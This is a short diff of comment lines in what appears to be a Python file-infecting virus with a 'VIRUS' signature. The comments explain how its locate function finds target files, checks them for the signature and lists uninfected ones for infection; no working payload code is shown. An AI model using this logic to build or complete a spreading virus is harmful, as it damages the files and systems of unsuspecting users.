@@ -5,7 +5,7 @@ import datetime
 # This is declaring the variable "SIGNATURE"
 SIGNATURE = "VIRUS"
 # This is defining a function that appears to return a list of files in a directory and checks if the path is an existing directory or not. If it is then the function will
-# add the specified elements to the end of the targeted files. Else/if the file name extension is .py the file is not infected and the function will open a file object and
+# add the specified elements to the end of the targeted files. Else/if the file is not infected then function will open a file object and
 # if the variable "SIGNATURE" exist the files are infected and the function stops. If the files are not infected the function will append a file path to the targeted files
 # and then terminates the function and returns the value of file_targeted.
 def locate(path):
